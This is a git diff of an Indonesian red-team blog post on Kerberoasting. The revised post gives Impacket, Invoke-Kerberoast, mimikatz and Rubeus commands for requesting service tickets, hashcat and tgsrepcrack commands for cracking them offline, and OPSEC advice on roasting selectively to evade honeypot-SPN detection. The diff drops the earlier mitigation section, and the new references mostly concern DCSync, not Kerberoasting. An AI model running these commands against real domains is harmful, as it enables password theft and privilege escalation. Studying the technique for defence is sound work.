@@ -1,130 +1,118 @@
 ---
-title: Keberoasting
+title: '[Kerberos] Kerberoasting'
 date: 2022-03-09 23:20:22 +0700
 categories: [Active Directory, Post Compromise Attack]
-tags: [active directory, windows, keberoasting, impacket, mimikatz, rubeus, kerberoast]     # TAG names should always be lowercase
+tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos, impacket, mimikatz, rubeus]      # TAG names should always be lowercase
 author: nairpaa
 ---
 
-## Apa itu SPN?
 
-**Service Principal Names (SPNs)** adalah pengidentifikasi unik dari *service instance*. SPN digunakan oleh otentikasi Kerberos untuk mengaitkan *service instance* dengan *service logon account*.
+Dalam lingkungan Active Directory, *service* berjalan di bawah konteks akun pengguna, yang dapat berupa akun lokal (`LocalSystem`, `LocalService`, `NetworkService`) atau akun domain (contoh: `DOMAIN\mssql`). 
 
-Dengan adanya SPN, suatu layanan dapat berjalan pada suatu komputer sebagai user tertentu yang dikendalikan oleh **Domain Admins**.
+Setiap *service* ini memiliki *Service Principal Name* (SPN) yang unik, yang berfungsi sebagai identifikasi untuk *service* tersebut dalam lingkungan Kerberos. SPN ini terhubung dengan akun yang menjalankan *service* dan dikonfigurasi pada `User Object` dalam Active Directory.
 
-## Mengapa SPN dikaitkan dengan user?
+![SPN User Object](/assets/img/posts/kerberoasting/1.png)
+_SPN User Object_
 
-Menurut [Mubix "Rob" Fuller](https://malicious.link/post/2016/kerberoast-pt1/), hal ini dilakukan agar layanan tidak berjalan sebagai **NT AUTHORITY\SYSTEM** yang akan sangat berbahaya ketika layanan tersebut berhasil dieksploitasi oleh penyerang.
+Bagian dari **Ticket Granting Service (TGS)** yang dikembalikan oleh *Key Distribution Center* (KDC) dienkripsi dengan rahasia yang berasal dari password akun pengguna yang menjalankan *service* tersebut. 
 
-## Kenapa ini penting?
+**Kerberoasting** adalah teknik yang memanfaatkan protokol Kerberos untuk memungkinkan penyerang memperoleh tiket layanan yang dienkripsi (TGS), lalu mencoba memecahkan enkripsi tersebut secara offline untuk mendapatkan password *plaintext* dari akun domain.
 
-Setiap user domain yang valid dapat me-*request* ticket Kerberos untuk layanan domain apa pun (atau bahkan layanan di luar domain selama ada *trust* di sana). 
+Teknik ini bisa digunakan untuk mendapatkan password *service* yang lemah, yang kemudian dapat digunakan untuk eskalasi hak istimewa atau *lateral movement* dalam jaringan.
 
-Setelah tiket diterima, *password cracking* dapat dilakukan secara offline pada ticket untuk mendapatkan password user menjalankan layanan tersebut. 
+## 0x1 - Exploitation Stages
 
-User yang menjalankan layanan ini biasanya paling tidak adalah administrator di komputer yang mereka gunakan (untuk layanan), tetapi lebih umum mereka adalah semacam akun administratif (**Domain Admins**).
-
----
-
-### Tujuan 
-
-- *Privilege escalation*
-
-
-### Prasyarat
-
-- Terdapat SPN pada user domain
-
-
-### Tools
-
-- Mimikatz
-- [Kerberoast Toolkit](https://github.com/nidem/kerberoast)
-
----
-
-## Tahap eksploitasi
-
-### Step 1: Dapatkan user dengan SPN
-
-#### Via remote (Kali)
+### A. Impacket
 
 ```bash
-# 1. list user SPN + request service ticket
+# List user SPN dan request service ticket
 ➜ GetUserSPNs.py <full-domain>/<user>:<password> -dc-ip <ip-dc> -request
 ```
 
-#### Via internal (Windows)
+### B. Invoke-Kerberoast.ps1
 
-- Invoke-Kerberoast.ps1
+- [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
 
 ```powershell
-# kerberoasting via Invoke-Kerberoast.ps1
+# Kerberoasting via Invoke-Kerberoast.ps1
 PS> .\Invoke-Kerberoast.ps1
 PS> invoke-kerberoast -outputformat hashcat
 
-# oneline
+# Kerberoasting dalam satu baris
 PS> powershell -c import-module .\Invoke-Kerberoast.ps1; invoke-kerberoast -outputformat hashcat
 ```
 
-- PowerView x Mimikatz:
+### C. PowerView + Mimikatz
 
 ```powershell
-# 1. list user SPN
+# 1. List user SPN
 PS> .\GetUserSPNs.ps1
 
-# 2. request service ticket
+# 2. Request service ticket
 PS> Add-Type -AssemblyName System.IdentityModel
 PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TRYHARDER-DC/SQLService.KATUHU.local:60111"
 
-# 3. ekstrak ticket (.kirbi) menggunakan mimikatz
+# 3. Ekstrak ticket (.kirbi) menggunakan mimikatz
 mimikatz > kerberos::list /export
-
-# 4. crack de ticket
-➜ python3 tgsrepcrack.py wordlist.txt file.kirbi 
 ```
 
-- Rubeus:
+### D. Rubeus
 
 ```powershell
-# Kerberoasting and outputing on a file with a spesific format
-PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
-
-# Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
-PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
-
-# Kerberoast AES enabled accounts
-PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
-
-# Kerberoast spesific user account
-PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
-
-# Kerberoast by specifying the authentication credentials
-PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
+# Kerberoasting menggunakan Rubeus
+PS > .\Rubeus.exe kerberoast /simple /nowrap
 ```
 
-### Step 2: Crack de hash
+> Meskipun Rubeus tidak menyertakan akun `krbtgt`, akun ini [terkadang](https://twitter.com/_wald0/status/1361720293539139589) dapat di-*crack*.
+{: .prompt-tip }
+
+## 0x2 - Crack the Ticket
+
+- [tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)
 
 ```bash
-➜ hashcat -m 13100 pass.hash /usr/share/wordlists/rockyou.txt 
+# Menggunakan tgsrepcrack.py
+➜ python3 tgsrepcrack.py <wordlist.txt> <file.kirbi> 
+
+# Menggunakan hashcat
+➜ hashcat -m 13100 <file.kirbi> <wordlist.txt> 
 ```
 
-## Mitigasi
 
-Terdapat beberapa mitigasi yang sangat mengurangi atau bahkan menghilangkan risiko ini, seperti:
+> **OPSEC**
+>
+> Secara default, Rubeus akan melakukan *roasting* pada setiap akun yang memiliki SPN.  Akun *Honey Pot* dapat dikonfigurasikan dengan SPN "palsu", yang akan menghasilkan *event* 4769 ketika di-*roasted*. 
+> 
+> Karena *event* ini tidak akan pernah men-*generate* untuk *service* tersebut, maka ini memberikan indikasi yang sangat akurat untuk serangan *keberoasting*.
+> 
+> Anda dapat mendeteksi ini dengan mencari kode *event* dan nama *service*:
+> ```
+> event.code: 4769 and winlog.event_data.ServiceName: honey_svc
+> ```
+{: .prompt-danger}
 
-- Tolak permintaan autentikasi yang tidak menggunakan **Kerberos Flexible Authentication Secure Tunneling (FAST)** (juga disebut *Kerberos Armoring*).
-- Hilangkan penggunaan protokol yang tidak aman di Kerberos. Seperti protokol **RC4**.
-- Terapkan kebijakan password yang kuat dan selalu diperbaharui. Contoh kata password adalah tidak mengandung kata yang umum, minimal 30 karakter dan diubah secara rutin.
-- Jika memungkinkan, terapkan penggunaan **Grup Managed Service Accounts (gMSA)**. Kata sandi ( 256 *random bytes*) untuk gMSA dibuat dan sering diubah oleh Active Directory, menghilangkan beban ini dari administrator.
-- Audit penetapan **servicePrincipalNames** ke akun pengguna sensitif. Misalnya, anggota **Domain Admins** tidak boleh digunakan sebagai *service account*.
+Untuk menghindari mendapatkan perhatian yang tidak diinginkan, pendekatan yang lebih aman adalah dengan mengenumerasi kandidat yang memungkinkan dan me-*roast*-nya secara selektif. 
+
+Kita dapat menggunakan kueri LDAP seperti yang ditunjukkan di bawah ini untuk menemukan pengguna domain yang memiliki SPN:
+
+```powershell
+PS > .\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
+```
+
+Kemudian, Anda bisa meroast akun individu dengan parameter `/user`:
+
+```powershell
+PS > .\Rubeus.exe kerberoast /user:mssql_svc /nowrap
+```
+
 
 ---
 
-## Referensi
+## 0x3 - References
 
-- https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting
-- https://github.com/nidem/kerberoast
-- https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names?redirectedfrom=MSDN
-- https://malicious.link/post/2016/kerberoast-pt1/
-- https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#kerberoast
+- https://adsecurity.org/?p=1729
+- https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync
+- https://www.qomplx.com/kerberos_dcsync_attacks_explained/
+- https://www.youtube.com/watch?v=aSAZzIqGeiY
+- https://yojimbosecurity.ninja/dcsync/#org4679e78
+- https://burmat.gitbook.io/security/hacking/domain-exploitation
